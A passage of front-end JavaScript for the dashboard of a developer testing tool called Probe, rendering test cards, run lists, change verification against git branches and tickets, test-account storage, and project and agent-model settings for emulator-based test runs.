data-l="${k}" class="${fl.level === k ? "active" : ""}">${label} <span class="muted">${k === "all" ? f.cards.length : f.cards.filter((c) => c.level === k).length}</span></button>`).join("")}</div>\n          <div class="seg" id="cst">${["all", "draft", "approved", "rejected"].map((k) => `<button data-s="${k}" class="${fl.status === k ? "active" : ""}">${k}</button>`).join("")}</div>\n        </div>\n        <div id="cardlist">${cards.length ? cards.map(cardHtml).join("") : `<div class="empty">No cards here with these filters.</div>`}</div>\n      </section>\n    </div>`;\n\n  bindCardActions(document.getElementById("cardlist"), renderCards);\n  const q = document.getElementById("cq");\n  q.addEventListener("input", () => {\n    const v = q.value.toLowerCase();\n    // Filter the sidebar in place, so typing never loses focus.\n    $view.querySelectorAll(".side li[data-f]").forEach((li) => {\n      const x = features.find((y) => y.id === li.dataset.f);\n      li.style.display = !v || (x.id + " " + x.cards.map((c) => c.title + " " + c.tickets.join(" ")).join(" ")).toLowerCase().includes(v) ? "" : "none";\n    });\n  });\n  q.addEventListener("change", () => { fl.q = q.value; });\n  $view.querySelectorAll(".side li[data-f]").forEach((li) => li.addEventListener("click", () => { fl.feature = li.dataset.f; fl.level = "all"; render(); }));\n  $view.querySelectorAll("button[data-side]").forEach((b) => b.addEventListener("click", () => { fl.side = b.dataset.side; renderCards(); }));\n  $view.querySelectorAll("#clv button").forEach((b) => b.addEventListener("click", () => { fl.level = b.dataset.l; renderCards(); }));\n  $view.querySelectorAll("#cst button").forEach((b) => b.addEventListener("click", () => { fl.status = b.dataset.s; renderCards(); }));\n  document.getElementById("rerunold")?.addEventListener("click", async (e) => {\n    e.target.disabled = true;\n    const res = await post("/api/verify", { outdated: true, features: [f.id] });\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => renderCards());\n  });\n  const approveAll = document.getElementById("approveall");\n  if (approveAll) approveAll.addEventListener("click", async () => {\n    if (!confirm(`Approve all ${f.draft} draft cards of ${f.id}? Approved cards run on a device in every verify.`)) return;\n    approveAll.disabled = true;\n    for (const c of f.cards.filter((x) => x.status === "draft")) await post(`/api/cards/${encodeURIComponent(c.feature)}/${encodeURIComponent(c.id)}/status`, { status: "approved" });\n    renderCards();\n  });\n  bindBackfillAll();\n}\n\nfunction bindBackfillAll() {\n  document.getElementById("bfall")?.addEventListener("click", async (e) => {\n    if (!confirm("Draft cards for every feature that has none? This runs one agent per feature and can take a while.")) return;\n    e.target.disabled = true;\n    const res = await post("/api/cards/*/backfill");\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; renderCards(); });\n  });\n}\n\n// \u2500\u2500 Runs: a filtered list with the selected run beside it, and a link (#runs/<id>) for each \u2500\u2500\n\nconst RUNS_PAGE = 50;\nconst TRIGGER = { claude: "Claude", agent: "an agent\'s", commit: "commit", editor: "editor", manual: "manual" };\nconst PROBLEM = new Set(["failed", "error"]);\n\nfunction runsState() {\n  if (!state.runs) state.runs = { data: null, kind: "all", status: "all", feature: "all", q: "", limit: RUNS_PAGE, selected: null };\n  return state.runs;\n}\n\nfunction runResult(r) {\n  if (r.kind === "backfill") return `${(r.written || []).length} cards \xB7 $${(r.costUsd || 0).toFixed(2)}`;\n  if (r.kind === "card") return `${esc(r.cardId)} \xB7 ${(r.timeline || []).length} steps \xB7 $${(r.costUsd || 0).toFixed(2)}${r.perf?.issues?.length ? ` \xB7 <span style="color:var(--warn)">perf \u26A0</span>` : ""}`;\n  if (r.kind === "verify") return `vs ${esc(r.base)} \xB7 ${r.features.length} features \xB7 ${r.features.reduce((n, f) => n + f.cards.filter((c) => c.runId).length, 0)} card runs`;\n  if (r.kind === "explore") return `${r.screens.length} screens \xB7 ${r.issues.length} issues`;\n  if (r.kind === "login") return r.login ? (r.login.state === "logged_in" ? (r.login.role ? `as ${esc(r.login.role)}` : "non-test account") : r.login.state.replace("_", " ")) : "\u2014";\n  if (r.kind === "unitwrite") return `${r.files.length} files \xB7 $${(r.costUsd || 0).toFixed(2)}`;\n  if (r.kind === "check") return (r.features || []).map((f) => `${esc(f.feature)} <span class="pill ${f.unitStatus || "none"}">${f.unitStatus || "\u2014"}</span>${f.draftId ? " \u270E" : ""}`).join(" ") || "nothing stale";\n  if (r.kind === "fix") return `${esc(r.issue.title.slice(0, 70))} \xB7 ${r.files.length} files`;\n  if (r.kind === "init") return `${(r.drafts || []).length} drafts`;\n  const results = r.results || [];\n  const t = results.reduce((n, x) => n + x.tests, 0), f = results.reduce((n, x) => n + x.failed, 0);\n  if (r.status === "error" && !t) return `<span style="color:var(--fail)">build failed</span>`;\n  return `${t} tests${f ? ` \xB7 <strong style="color:var(--fail)">${f} failed</strong>` : ""}`;\n}\n\nfunction filteredRuns() {\n  const s = runsState();\n  const q = s.q.trim().toLowerCase();\n  return s.data.filter((r) =>\n    (s.kind === "all" || r.kind === s.kind) &&\n    (s.status === "all" || (s.status === "problems" ? PROBLEM.has(r.status) : r.status === s.status)) &&\n    (s.feature === "all" || r.feature === s.feature || (r.features || []).some((f) => f.feature === s.feature)) &&\n    (!q || [r.id, r.feature, r.cardId, r.kind].some((x) => String(x || "").toLowerCase().includes(q))));\n}\n\nasync function renderRuns() {\n  const s = runsState();\n  $view.innerHTML = `<div class="empty">Loading runs\u2026</div>`;\n  s.data = await api("/api/runs");\n  if (!s.data.length) { $view.innerHTML = `<div class="empty">No runs yet. Open a feature in Atlas and run its unit tests.</div>`; return; }\n  const kinds = [...new Set(s.data.map((r) => r.kind))].sort();\n  const features = [...new Set(s.data.flatMap((r) => [r.feature, ...(r.features || []).map((f) => f.feature)]).filter((f) => f && f !== "*"))].sort();\n  const opt = (v, label, cur) => `<option value="${esc(v)}" ${v === cur ? "selected" : ""}>${esc(label)}</option>`;\n  $view.innerHTML = `<div class="runs-layout">\n    <section class="runs-list">\n      <div class="filters">\n        <select id="fk" title="Kind">${opt("all", "All kinds", s.kind)}${kinds.map((k) => opt(k, k, s.kind)).join("")}</select>\n        <select id="fs" title="Status">${opt("all", "Any status", s.status)}${opt("problems", "Failed or error", s.status)}${["passed", "running", "stopped"].map((k) => opt(k, k, s.status)).join("")}</select>\n        <select id="ff" title="Feature">${opt("all", "All features", s.feature)}${features.map((f) => opt(f, f, s.feature)).join("")}</select>\n        <input id="fq" type="search" placeholder="Search run, card\u2026" value="${esc(s.q)}">\n      </div>\n      <div id="runrows"></div>\n    </section>\n    <aside class="runs-detail" id="rundetail"></aside>\n  </div>`;\n  const bind = (id, key, ev = "change") => document.getElementById(id).addEventListener(ev, (e) => { s[key] = e.target.value; s.limit = RUNS_PAGE; renderRunRows(); });\n  bind("fk", "kind"); bind("fs", "status"); bind("ff", "feature"); bind("fq", "q", "input");\n  renderRunRows();\n  // Opened from a link: bring its row into view too, showing more of the list if it is further down.\n  if (s.selected) {\n    const at = filteredRuns().findIndex((r) => r.id === s.selected);\n    if (at >= s.limit) { s.limit = Math.ceil((at + 1) / RUNS_PAGE) * RUNS_PAGE; renderRunRows(); }\n    document.querySelector("#runrows tr.sel")?.scrollIntoView({ block: "center" });\n    showRun(s.selected);\n  }\n  else document.getElementById("rundetail").innerHTML = `<div class="empty">Select a run to see its result, evidence and fixes.</div>`;\n}\n\nfunction renderRunRows() {\n  const s = runsState();\n  const all = filteredRuns();\n  const shown = all.slice(0, s.limit);\n  const el = document.getElementById("runrows");\n  if (!el) return;\n  el.innerHTML = !all.length ? `<div class="empty">No runs match these filters.</div>` : `<table><thead><tr><th>When</th><th>Feature</th><th>Kind</th><th>Status</th><th>Result</th></tr></thead><tbody>\n    ${shown.map((r) => `<tr class="click${r.id === s.selected ? " sel" : ""}" data-id="${esc(r.id)}">\n      <td><span title="${esc(r.finishedAt || r.startedAt)}">${ago(r.finishedAt || r.startedAt)}</span><br><span class="mono muted" style="font-size:11px">${esc(r.id)}</span></td>\n      <td>${esc(r.feature)}</td><td>${esc(r.kind)}</td>\n      <td><span class="pill ${r.status}">${r.status}</span>${r.status === "running" ? ` <button class="btn stop" data-stop="${esc(r.id)}">\u25A0 Stop</button>` : ""}</td>\n      <td class="res">${runResult(r)}</td></tr>`).join("")}</tbody></table>`;\n  el.insertAdjacentHTML("beforeend", `<div class="count"><span>${shown.length} of ${all.length} runs${all.length < s.data.length ? ` (${s.data.length} in all)` : ""}</span>${all.length > shown.length ? `<button class="btn secondary" id="rmore">Show ${Math.min(RUNS_PAGE, all.length - shown.length)} more</button>` : ""}</div>`);\n  el.querySelectorAll("tr.click").forEach((tr) => tr.addEventListener("click", () => selectRun(tr.dataset.id)));\n  el.querySelector("#rmore")?.addEventListener("click", () => { s.limit += RUNS_PAGE; renderRunRows(); });\n  el.querySelectorAll("button[data-stop]").forEach((b) => b.addEventListener("click", async (e) => {\n    e.stopPropagation();\n    if (!confirm(`Stop run ${b.dataset.stop}?`)) return;\n    b.disabled = true;\n    const res = await stopRunReq(b.dataset.stop);\n    if (res.error) alert(res.error);\n    setTimeout(renderRuns, 1500);\n  }));\n}\n\n/** Opens a run beside the list and puts it in the address, so the link reopens it. */\nfunction selectRun(id) {\n  runsState().selected = id;\n  saveRoute();\n  document.querySelectorAll("#runrows tr.click").forEach((tr) => tr.classList.toggle("sel", tr.dataset.id === id));\n  showRun(id);\n}\n\nfunction closeRun() {\n  closeStream();\n  runsState().selected = null;\n  saveRoute();\n  document.querySelectorAll("#runrows tr.sel").forEach((tr) => tr.classList.remove("sel"));\n  const panel = document.getElementById("rundetail");\n  panel.classList.remove("open");\n  panel.innerHTML = `<div class="empty">Select a run to see its result, evidence and fixes.</div>`;\n}\n\nfunction showRun(id) {\n  const panel = document.getElementById("rundetail");\n  if (!panel) return;\n  panel.classList.add("open");\n  panel.scrollTop = 0;\n  panel.innerHTML = `<div class="dhead"><button class="btn secondary" id="rlink" title="Copy a link to this run">\u29C9 Link</button><button class="btn secondary" id="rclose" title="Close">\u2715</button></div><div id="rbody"></div>`;\n  panel.querySelector("#rclose").addEventListener("click", closeRun);\n  panel.querySelector("#rlink").addEventListener("click", (e) => navigator.clipboard.writeText(location.href).then(() => { e.target.textContent = "Copied"; }));\n  // A run that ends while it is open refreshes the list, so its row shows how it ended.\n  followRun(id, panel.querySelector("#rbody"), () => api("/api/runs").then((runs) => { runsState().data = runs; renderRunRows(); }));\n}\n\nasync function renderVerify() {\n  if (!state.verify) state.verify = { base: "" };\n  $view.innerHTML = `<div class="empty">Reading the change\u2026</div>`;\n  const [ch, br] = await Promise.all([api("/api/changes" + (state.verify.base ? `?base=${encodeURIComponent(state.verify.base)}` : "")), api("/api/branch?branches")]);\n  const here = br.git ? `<strong>${esc(br.id)}</strong> @ <span class="mono">${esc(br.git.commit)}</span>${br.git.dirty ? ` + ${br.git.dirty} uncommitted file(s)` : ""}` : "no git";\n  $view.innerHTML = `\n    <div class="box"><h3>Verify this change</h3>\n      <p style="margin-top:0">Testing ${here}${ch.base ? ` against <strong>${esc(ch.base)}</strong>` : ""}.</p>\n      ${br.warnings.length ? `<ul style="color:var(--warn);margin-top:0">${br.warnings.map((w) => `<li>${esc(w)}</li>`).join("")}</ul>` : ""}\n      <p class="muted" style="margin-top:0">Files changed since the base branch, plus uncommitted and untracked work, mapped to features. Verify runs their unit tests, then reinstalls the app from this code and runs their cards on an emulator.</p>\n      <form class="inline" id="vf">\n        <label>Compare with<select name="base">${(br.branches.includes(ch.base) || !ch.base ? br.branches : [ch.base, ...br.branches]).map((b) => `<option ${b === ch.base ? "selected" : ""}>${esc(b)}</option>`).join("")}</select></label>\n        <label>Max card runs<input name="maxCards" type="number" min="0" max="50" style="width:90px" placeholder="10"></label>\n        <label class="check"><input type="checkbox" name="allCards"> include draft cards</label>\n        <label class="check"><input type="checkbox" name="noDevice"> unit tests only</label>\n        <button class="btn" type="submit" data-job="${esc(jobKey.verifyBase(ch.base))}" data-busy="Verifying\u2026" ${ch.features.length ? "" : "disabled"}>\u2713 Verify ${ch.features.length} feature${ch.features.length === 1 ? "" : "s"}</button>\n        <button class="btn secondary" type="button" id="vrefresh">Refresh</button>\n      </form>\n      <div style="margin-top:12px">${ch.base ? `${ch.files.length} changed files vs <strong>${esc(ch.base)}</strong>` : `<span style="color:var(--fail)">No base branch found; enter one.</span>`}</div>\n      ${ch.features.length ? `<table style="margin-top:8px"><thead><tr><th>Feature</th><th>Changed files</th></tr></thead><tbody>${ch.features.map((f) => `<tr><td><strong>${esc(f.feature)}</strong></td><td class="mono muted">${f.files.slice(0, 6).map(esc).join("<br>")}${f.files.length > 6 ? `<br>\u2026 ${f.files.length - 6} more` : ""}</td></tr>`).join("")}</tbody></table>` : ""}\n      ${ch.unowned.length ? `<details style="margin-top:8px"><summary class="muted">${ch.unowned.length} files outside any module</summary><p class="mono muted">${ch.unowned.map(esc).join("<br>")}</p></details>` : ""}\n    </div>\n    <div class="box"><h3>From a ticket</h3>\n      <form class="inline" id="tf">\n        <label>Ticket<input name="ticket" placeholder="PROJ-1234" required></label>\n        <button class="btn secondary" type="button" id="tlook">Look up</button>\n        <button class="btn secondary" type="button" id="tverify" title="Unit tests and cards of the features this ticket\'s commits touched, its own cards first">\u2713 Verify ticket</button>\n      </form>\n      <div id="tinfo"></div>\n      <form class="inline" id="tc" style="margin-top:10px">\n        <label style="flex:1 1 100%">Ticket text (optional: paste the description and acceptance criteria)<textarea name="text" placeholder="As a user I can\u2026"></textarea></label>\n        <label>Feature(s), when no commit names the ticket yet<input name="features" placeholder="comment, chat"></label>\n        <button class="btn" type="submit">\u2726 Draft cards from ticket</button>\n      </form>\n    </div>\n    <div id="runpanel"></div>`;\n  const vf = document.getElementById("vf");\n  document.getElementById("vrefresh").addEventListener("click", () => { state.verify.base = vf.base.value; renderVerify(); });\n  vf.base.addEventListener("change", () => { state.verify.base = vf.base.value; renderVerify(); });\n  vf.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const res = await post("/api/verify", { base: vf.base.value || undefined, noDevice: vf.noDevice.checked, cards: vf.allCards.checked ? "all" : undefined, maxCards: vf.maxCards.value ? Number(vf.maxCards.value) : undefined });\n    if (res.error) return alert(res.error);\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n  const tf = document.getElementById("tf");\n  const ticket = () => tf.ticket.value.trim();\n  document.getElementById("tlook").addEventListener("click", async () => {\n    if (!ticket()) return;\n    const t = await api("/api/tickets/" + encodeURIComponent(ticket()));\n    document.getElementById("tinfo").innerHTML = `<div style="margin-top:10px">${t.url ? `<a href="${esc(t.url)}" target="_blank">${esc(t.id)}</a>` : `<strong>${esc(t.id)}</strong>`} \xB7 features: ${t.features.map(esc).join(", ") || "none"} \xB7 cards: ${t.cards.map(esc).join(", ") || "none"}\n      <ul class="mono muted">${t.commits.map((c) => `<li>${esc(c.hash)} ${esc(c.date)} ${esc(c.subject)}</li>`).join("") || "<li>No commits mention it.</li>"}</ul></div>`;\n  });\n  document.getElementById("tverify").addEventListener("click", async () => {\n    if (!ticket()) return;\n    const res = await post("/api/verify", { ticket: ticket(), cards: "all" });\n    if (res.error) return alert(res.error);\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n  document.getElementById("tc").addEventListener("submit", async (e) => {\n    e.preventDefault();\n    if (!ticket()) return alert("Enter the ticket id above.");\n    const tc = e.target;\n    const res = await post("/api/tickets/cards", { ticket: ticket(), text: tc.text.value, features: tc.features.value.split(",").map((x) => x.trim()).filter(Boolean) });\n    if (res.error) return alert(res.error);\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n}\n\nasync function renderAccounts(el) {\n  const [accounts, login] = await Promise.all([api("/api/accounts"), api("/api/login")]);\n  const mark = (ok) => ok ? `<span class="pill passed">stored</span>` : `<span class="muted">\u2014</span>`;\n  const l = login && login.run.login;\n  const loginText = !l ? "Not checked yet." : l.state === "logged_in" ? (l.role ? `Logged in as <strong>${esc(l.role)}</strong>${l.seenAs ? ` (${esc(l.seenAs)})` : ""}` : `<strong style="color:var(--fail)">Logged in with an account that is not a test account</strong>${l.seenAs ? ` (${esc(l.seenAs)})` : ""} \u2014 agents will not change anything`) : l.state === "logged_out" ? "Logged out" : "Unknown";\n  el.innerHTML = `\n    <div class="box"><h3>Who the app on the device is logged in as</h3>\n      <div class="row" style="flex-wrap:wrap">${loginText} ${login ? `<span class="muted">\xB7 ${esc(login.run.device)} \xB7 ${ago(login.at)}</span>` : ""}<span style="flex:1"></span>\n        <button class="btn secondary" id="logincheck" data-job="${esc(jobKey.login())}" data-busy="Checking\u2026" title="An agent opens the app on the emulator and reports who is logged in">Check login</button></div>\n      <div id="runpanel"></div></div>`;\n  el.innerHTML += `\n    <div class="box"><h3>Test accounts</h3>\n    <p class="muted" style="margin-top:0">Accounts agents may log in with. Roles and usernames are shared with the team in <span class="mono">probe/hints/accounts.yaml</span>; passwords and login codes are encrypted on this machine only, and agents never see them \u2014 Probe types them on the device.</p>\n    ${accounts.length ? `<table><thead><tr><th>Role</th><th>Username</th><th>Shown as</th><th>Notes</th><th>Password</th><th>Login code</th><th></th></tr></thead><tbody>\n      ${accounts.map((a) => `<tr><td class="mono">${esc(a.role)}</td><td>${esc(a.username)}</td><td>${esc(a.shownAs)}</td><td class="muted">${esc(a.notes)}</td><td>${mark(a.hasPassword)}</td><td>${mark(a.hasCode)}</td>\n        <td style="white-space:nowrap"><button class="btn secondary" data-login="${esc(a.role)}" data-job="${esc(jobKey.login(a.role))}" data-busy="Logging in\u2026" ${a.hasPassword ? "" : "disabled"} title="An agent logs the app on the emulator in with this account">Log in on device</button> <button class="btn secondary" data-edit="${esc(a.role)}">Edit</button> <button class="btn secondary" data-del="${esc(a.role)}">Remove</button></td></tr>`).join("")}\n    </tbody></table>` : `<div class="empty">No test accounts yet. Without one, a card that needs login ends as blocked.</div>`}\n    <form class="acct" autocomplete="off">\n      <label>Role<input name="role" placeholder="user_a" required pattern="[\\\\w-]{1,40}"></label>\n      <label>Username<input name="username" placeholder="tester.a@example.com" required></label>\n      <label>Shown as<input name="shownAs" placeholder="@tester_a or Tester A" title="The name or handle the app shows when logged in, so agents recognise the account"></label>\n      <label>Notes<input name="notes" placeholder="main tester, has posts"></label>\n      <label>Password<input name="password" type="password" autocomplete="new-password" placeholder="unchanged if empty"></label>\n      <label>Login code<input name="code" type="password" autocomplete="off" placeholder="only if fixed"></label>\n      <button class="btn" type="submit">Save account</button>\n    </form></div>`;\n  const startLogin = async (role, b) => {\n    b.disabled = true;\n    const res = await post("/api/login", { role });\n    if (res.error) { alert(res.error); b.disabled = false; return; }\n    followRun(res.runId, el.querySelector("#runpanel"), () => renderAccounts(el));\n  };\n  el.querySelector("#logincheck").addEventListener("click", (e) => startLogin(undefined, e.target));\n  el.querySelectorAll("button[data-login]").forEach((b) => b.addEventListener("click", () => startLogin(b.dataset.login, b)));\n  const form = el.querySelector("form.acct");\n  form.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const body = Object.fromEntries(new FormData(form));\n    const res = await api("/api/accounts", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });\n    if (res.error) return alert(res.error);\n    renderAccounts(el);\n  });\n  el.querySelectorAll("button[data-edit]").forEach((b) => b.addEventListener("click", () => {\n    const a = accounts.find((x) => x.role === b.dataset.edit);\n    form.role.value = a.role; form.username.value = a.username; form.shownAs.value = a.shownAs || ""; form.notes.value = a.notes || "";\n    form.password.focus();\n  }));\n  el.querySelectorAll("button[data-del]").forEach((b) => b.addEventListener("click", async () => {\n    if (!confirm(`Remove ${b.dataset.del} and its stored password?`)) return;\n    await api(`/api/accounts/${encodeURIComponent(b.dataset.del)}`, { method: "DELETE" });\n    renderAccounts(el);\n  }));\n}\n\nconst SOURCE_LABEL = { machine: "set on this machine", project: "from probe/probe.yaml (team default)", default: "Probe\'s default" };\n\n/** Why device features are off for this project, or "" when its app runs on a device. */\nfunction noDevices() {\n  return state.scan && state.scan.project.devices === false ? "Not available for this kind of project: running the app on a device needs an adapter that supports it (Android/Gradle today)." : "";\n}\n\nconst APP_SOURCE = { "probe.yaml": "set here", "last build": "found in the last build", "build file": "found in the build file", detected: "found in the project" };\n\nfunction projectBox(p) {\n  const a = p.app;\n  const real = [...new Set([...p.devices.connected.filter((d) => !d.emulator).map((d) => d.serial), ...p.devices.allowReal])];\n  const model = (serial) => p.devices.connected.find((d) => d.serial === serial)?.model;\n  const branches = p.branches || [];\n  const opt = (v, label, sel) => `<option value="${esc(v)}" ${sel ? "selected" : ""}>${esc(label)}</option>`;\n  const dev = p.devices.supported !== false;\n  return `<div class="box"><h3>Project</h3>\n    <p class="muted" style="margin-top:0">Probe fills these in from the project; leave a field empty to keep what it found. Shared settings are saved to <span class="mono">probe/probe.yaml</span> for the team (commit it), the emulator and phones only for this machine.</p>\n    <form class="inline" id="pf">\n      ${dev ? `<label>App id <span class="src">${a.package ? esc(APP_SOURCE[a.packageSource]) : "not found yet"}</span><input name="package" value="${esc(p.appSet.package || "")}" placeholder="${esc(a.package || "read after the first install")}" style="width:260px"></label>\n      <label>Install task <span class="src">${a.installTask ? esc(APP_SOURCE[a.installSource]) : "not found"}</span><input name="installTask" value="${esc(p.appSet.installTask || "")}" placeholder="${esc(a.installTask || ":app:installDebug")}" style="width:220px"></label>\n      <label>Emulator <span class="src">this machine</span><select name="avd">${opt("", p.devices.avds.length ? `Automatic (${p.devices.avds[0]})` : "Automatic (none on this machine)", !p.devices.avd)}${p.devices.avds.map((v) => opt(v, v, v === p.devices.avd)).join("")}</select></label>\n      ${real.length ? `<div style="flex:1 1 100%"><div class="muted" style="font-size:12px;font-weight:600">Real phones agents may use <span class="src">this machine \xB7 a phone usually carries someone\'s own accounts</span></div>\n        ${real.map((r) => `<label class="check"><input type="checkbox" name="allowReal" value="${esc(r)}" ${p.devices.allowReal.includes(r) ? "checked" : ""}> ${esc(r)}${model(r) ? ` (${esc(model(r))})` : " (not connected)"}</label>`).join("")}</div>` : ""}` : `<p class="muted" style="flex:1 1 100%;margin:0">${esc(p.devices.unsupported)}</p>`}\n      <label>Verify against <span class="src">base branch</span><select name="base">${opt("", `Automatic (${p.verify.defaultBase || "none found"})`, !p.verify.base)}${branches.map((b) => opt(b, b, b === p.verify.base)).join("")}</select></label>\n      <label>Cards in verify<select name="cards">${opt("approved", "Approved only", p.verify.cards === "approved")}${opt("all", "Drafts too", p.verify.cards === "all")}</select></label>\n      <label>Max card runs<input name="maxCards" type="number" min="1" max="50" value="${p.verify.maxCards}" style="width:90px"></label>\n      ${dev ? `<label>Cold start limit (ms)<input name="maxStartupMs" type="number" min="1" value="${p.perf.maxStartupMs}" style="width:110px"></label>\n      <label>Janky frames limit (%)<input name="maxJankyPct" type="number" min="1" value="${p.perf.maxJankyPct}" style="width:110px"></label>\n      <label>90th pct frame (ms)<input name="maxP90Ms" type="number" min="1" value="${p.perf.maxP90Ms}" style="width:110px"></label>\n      <label>Memory limit (MB)<input name="maxMemoryMb" type="number" min="1" value="${p.perf.maxMemoryMb ?? ""}" placeholder="none" style="width:110px"></label>` : ""}\n      <label>Ticket id pattern<input name="pattern" value="${esc(p.tickets.pattern)}" style="width:180px" class="mono"></label>\n      <label>Ticket link (<span class="mono">{id}</span>)<input name="url" value="${esc(p.tickets.url || "")}" placeholder="https://jira.example.com/browse/{id}" style="width:300px"></label>\n      <label style="flex:1 1 100%">Command that files a ticket (<span class="mono">{title}</span>, <span class="mono">{file}</span>), only ever run when someone presses File<input name="fileCommand" value="${esc(p.tickets.fileCommand || "")}" placeholder="gh issue create --title {title} --body-file {file}" class="mono"></label>\n      <button class="btn" type="submit">Save project settings</button>\n    </form>\n    <p id="pout" style="margin-bottom:0"></p>\n  </div>`;\n}\n\nfunction bindProject() {\n  const f = document.getElementById("pf");\n  f.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const num = (v) => (v === "" ? null : Number(v));\n    const body = {\n      verify: { base: f.base.value || null, cards: f.cards.value, maxCards: Number(f.maxCards.value) },\n      tickets: { pattern: f.pattern.value.trim() || null, url: f.url.value.trim() || null, fileCommand: f.fileCommand.value.trim() || null },\n    };\n    // App, device and performance fields only exist on a project whose app runs on a device.\n    if (f.package) {\n      body.app = { package: f.package.value.trim() || null, installTask: f.installTask.value.trim() || null };\n      body.devices = { avd: f.avd.value || null, allowReal: [...f.querySelectorAll("input[name=allowReal]:checked")].map((i) => i.value) };\n      body.perf = { maxStartupMs: num(f.maxStartupMs.value), maxJankyPct: num(f.maxJankyPct.value), maxP90Ms: num(f.maxP90Ms.value), maxMemoryMb: num(f.maxMemoryMb.value) };\n      for (const k of ["maxStartupMs", "maxJankyPct", "maxP90Ms"]) if (body.perf[k] === null) delete body.perf[k];\n    }\n    const res = await post("/api/project", body);\n    document.getElementById("pout").innerHTML = res.error ? `<span class="pill failed">not saved</span> ${esc(res.error)}` : `<span class="pill passed">saved</span>`;\n    if (!res.error) setTimeout(renderSettings, 700);\n  });\n}\n\nasync function renderSettings() {\n  $view.innerHTML = `<div class="empty">Reading settings\u2026</div>`;\n  const [s, p, br] = await Promise.all([api("/api/settings"), api("/api/project"), api("/api/branch?branches")]);\n  p.branches = br.branches;\n  const current = s.agents.model;\n  const runner = s.agents.runners.find((r) => r.id === s.agents.runner) ?? s.agents.runners[0];\n  const models = runner.models;\n  const known = models.some(([m]) => m === current);\n  $view.innerHTML = projectBox(p) + `<div id="acctwrap"></div>` + `\n    <div class="box"><h3>Agents</h3>\n      <p class="muted" style="margin-top:0">Every Probe agent (drafting cards, device runs, verify, writing tests) runs headless on a coding-agent CLI with your own login and plan, with Probe attached as its MCP server. Both are saved for this machine only, since each developer\'s tools and plan differ; the team default lives in <span class="mono">agents</span> in probe/probe.yaml, and a run started from the CLI can still pass <span class="mono">--model</span>.</p>\n      <form class="inline" id="sf">\n        <label>Runs on<select name="runner">${s.agents.runners.map((r) => `<option value="${r.id}" ${r.id === runner.id ? "selected" : ""}>${esc(r.label)}</option>`).join("")}</select></label>\n        <label>Model<select name="pick">${models.map(([m, label]) => `<option value="${esc(m)}" ${m === current ? "selected" : ""}>${esc(label)}</option>`).join("")}<option value="custom" ${known ? "" : "selected"}>Other\u2026</option></select></label>\n        <label id="customwrap" style="${known ? "display:none" : ""}">Model name<input name="custom" value="${known ? "" : esc(current)}" placeholder="${runner.id === "claude" ? "claude-sonnet-5-5" : "a name codex --model accepts"}"></label>\n        <button class="btn" type="submit">Save</button>\n        <button class="btn secondary" type="button" id="stest" title="Sends one tiny prompt with this model to check your plan can run it">Test on my plan</button>\n        ${s.agents.source === "machine" || s.agents.runnerSource === "machine" ? `<button class="btn secondary" type="button" id="sreset">Use team default</button>` : ""}\n      </form>\n      <p style="margin-bottom:0">In use: <strong>${esc(runner.label)}</strong> <span class="muted">\xB7 ${SOURCE_LABEL[s.agents.runnerSource]}</span> \xB7 <strong class="mono">${esc(current || "its default model")}</strong> <span class="muted">\xB7 ${SOURCE_LABEL[s.agents.source]}</span></p>\n      <p id="sout" style="margin-bottom:0"></p>\n    </div>`;\n  bindProject();\n  renderAccounts(document.getElementById("acctwrap"));\n  const form = document.getElementById("sf");\n  const chosen = () => (form.pick.value === "custom" ? form.custom.value.trim() : form.pick.value);\n  form.pick.addEventListener("change", () => { document.getElementById("customwrap").style.display = form.pick.value === "custom" ? "" : "none"; });\n  // The model list belongs to the runner, so a new runner is saved at once and the box redrawn.\n  form.runner.addEventListener("change", async () => {\n    const res = await post("/api/settings", { runner: form.runner.value });\n    if (res.error) return alert(res.error);\n    renderSettings();\n  });\n  const out = document.getElementById("sout");\n  form.addEventListener("submit", async (e) => {\n    e.preventDefault();\n    const res = await post("/api/settings", { model: chosen() });\n    if (res.error) return alert(res.error);\n    renderSettings();\n  });\n  document.getElementById("stest").addEventListener("click", async (e) => {\n    e.target.disabled = true; out.innerHTML = `<span class="muted">Asking ${esc(chosen() || runner.label)}\u2026</span>`;\n    const r = await post("/api/settings/test", { model: chosen() });\n    e.target.disabled = false;\n    out.innerHTML = r.ok\n      ? `<span class="pill passed">works</span> <span class="mono">${esc(r.model)}</span> answered on your plan.`\n      : `<span class="pill failed">not usable</span> <span class="mono">${esc(r.model)}</span>: ${esc(r.message)}`;\n  });\n  const reset = document.getElementById("sreset");\n  if (reset) reset.addEventListener("click", async () => { await post("/api/settings", { runner: "", model: "" }); renderSettings(); });\n}\n\nasync function renderDoctor(el) {\n  el.innerHTML = `<div class="empty">Checking the machine\u2026</div>`;\n  const checks = await api("/api/doctor");\n  el.innerHTML = `<h2>System checks</h2><table><thead><tr><th>Check</th><th>Status</th><th>Detail</th></tr></thead><tbody>\n    ${checks.map((c) => `<tr><td><strong>${esc(c.label)}</strong></td><td><span class="pill ${c.status}">${c.status}</span></td><td>${esc(c.detail)}${c.fix ? `<br><span class="muted">\u2192 ${esc(c.fix)}</span>` : ""}</td></tr>`).join("")}\n  </tbody></table>`;\n}\n\nconst STATUS_ICON = { ok: "\u2713", warn: "!", fail: "\u2715" };\nconst INIT_PILL = { done: ["ok", "\u2713"], todo: ["none", "\xB7"], waiting: ["warn", "\u2026"], warn: ["warn", "!"] };\nconst INIT_RUNNABLE = new Set(["config", "kit", "scan", "manifests", "cards", "agentfile"]);\n\n/**\n * Which features and platform areas get a manifest, side by side. Before any choice everything is\n * ticked; after one, only what was chosen, and areas the scan found since are marked new. One with\n * a written manifest stays chosen.\n */\nfunction areaPicker(k) {\n  const first = !k.chosen;\n  const box = (a) => `<label style="font-size:13px" title="${a.modules} modules \xB7 ${a.testable} testable classes \xB7 ${a.testFiles} test files"><input type="checkbox" data-feat="${esc(a.id)}" data-kind="${a.kind}" ${a.manifest ? "checked disabled" : a.chosen || first ? "checked" : ""}> ${esc(a.id)}${a.undecided && !first ? ` <span 